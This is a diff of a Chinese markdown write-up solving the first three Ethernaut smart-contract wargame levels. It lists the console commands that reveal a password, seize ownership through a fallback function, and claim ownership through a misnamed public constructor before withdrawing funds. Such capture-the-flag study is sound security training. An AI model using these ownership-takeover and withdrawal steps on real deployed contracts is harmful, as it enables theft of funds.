@@ -1,30 +1,30 @@
 ###  1. 你好Ethernaut
 ##### 按照提示输入以下指令
-await contract.info()
+**await contract.info()**
 "You will find what you need in info1()."
 
-await contract.info1()
+**await contract.info1()**
 "Try info2(), but with "hello" as a parameter."
 
-await contract.info2("hello")
+**await contract.info2("hello")**
 "The property infoNum holds the number of the next info method to call."
 
-await contract.infoNum()
+**await contract.infoNum()**
 42
 
-await contract.info42()
+**await contract.info42()**
 "theMethodName is the name of the next method."
 
-await contract.theMethodName()
+**await contract.theMethodName()**
 "The method name is method7123949."
 
-await contract.method7123949()
+**await contract.method7123949()**
 "If you know the password, submit it to authenticate()."
 
-await contract.password()
+**await contract.password()**
 "ethernaut0"
 
-await contract.authenticate("ethernaut0")
+**await contract.authenticate("ethernaut0")**
 ### 2. Fallback
 ##### 对合约转账1wei从而改变其balance,调用sendTransaction函数触发fallback获取合约的owner变为自己的地址，再用withdraw转走合约的代币ine
 await getBalance(instance)
@@ -39,7 +39,7 @@ await contract.owner()
 
 await contract.withdraw()
 ### 3. Fallout
-##### 查看合约的owner,调用函数来更换合约的owner
+##### 查看合约的owner,调用函数来更换合约的owner 构造函数名称与合约名称不一致使其成为一个public类型的函数，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。
 await contract.owner()
 
 await contract.Fallout()
